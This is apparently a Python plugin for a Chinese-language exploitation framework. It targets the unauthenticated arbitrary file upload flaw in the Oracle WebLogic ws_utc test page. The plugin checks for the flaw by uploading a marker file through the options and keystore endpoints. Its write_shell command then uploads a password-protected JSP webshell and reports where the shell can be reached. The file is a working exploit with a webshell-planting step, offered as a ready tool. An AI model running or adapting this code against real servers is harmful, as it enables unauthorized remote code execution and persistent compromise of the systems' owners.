# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "WebLogic任意文件上传漏洞",
        "description": "WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。Oracle修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，web Service Test Page 在生产模式 下默认不开启，所以该漏洞有一定限制两个页面分别为/ws_utc/begin.do，/ws_utc/config.do",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(10)
        res = self.custom_upload_file(self.target.value, 'error.jsp', random_str, random_str)
        if res:
            return {"LoopholeInfo": self.__info__}

    def custom_upload_file(self, url, filename, content, flag):
        self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './ws_utc/resources/setting/options'),
            timeout=15,
            data={
                "setting_id": "general",
                "BasicConfigOptions.workDir": "/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
                "BasicConfigOptions.proxyHost": "",
                "BasicConfigOptions.proxyPort": "80"
            },
        )
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './ws_utc/resources/setting/keystore'),
            timeout=15,
            files={"ks_filename": (filename, content.encode())}
        )
        match = re.findall("<id>(.*?)</id>", r.text)
        if match:
            url = urllib.parse.urljoin(url, f'./ws_utc/css/config/keystore/{match[-1]}_{filename}')
            r = self.request(method='get', url=url, timeout=15)
            if r.status_code == 200 and flag in r.text:
                return url

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('jsp')
        res = self.custom_upload_file(url, name, code, flag)
        if res:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {res}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
